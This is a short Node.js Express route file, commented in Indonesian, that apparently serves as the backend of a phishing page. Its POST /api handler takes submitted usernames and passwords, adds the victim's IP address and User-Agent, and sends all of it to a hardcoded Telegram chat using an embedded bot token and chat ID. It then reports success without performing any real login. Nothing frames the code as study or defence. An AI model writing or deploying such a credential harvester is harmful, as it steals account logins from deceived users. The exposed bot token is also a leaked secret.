const express = require('express');
const bodyParser = require('body-parser');
const TelegramBot = require('node-telegram-bot-api');
const requestIp = require('request-ip');

const router = express.Router();

// Konfigurasi bot Telegram
const botToken = '5650627410:AAEbMtk086kXgocGZ2-c4_cCgsyrUpZtHvk';
const chatId = '5198662221';
const bot = new TelegramBot(botToken);

// Middleware untuk memproses permintaan POST
router.use(bodyParser.urlencoded({ extended: false }));
router.use(bodyParser.json());

// Middleware untuk mendapatkan alamat IP pengguna
router.use(requestIp.mw());

// Endpoint API untuk menerima permintaan POST
router.post('/api', (req, res) => {
  const { username, password } = req.body;

  // Mendapatkan informasi IP dan OS pengguna
  const ip = req.clientIp;
  const userAgent = req.get('User-Agent');

  // Kirim pesan ke Telegram
  const message = `Username: ${username}\nPassword: ${password}\nIP: ${ip}\nUser Agent: ${userAgent}`;
  bot.sendMessage(chatId, message);
  res.status(200).json({ success: true });
});

module.exports = router;

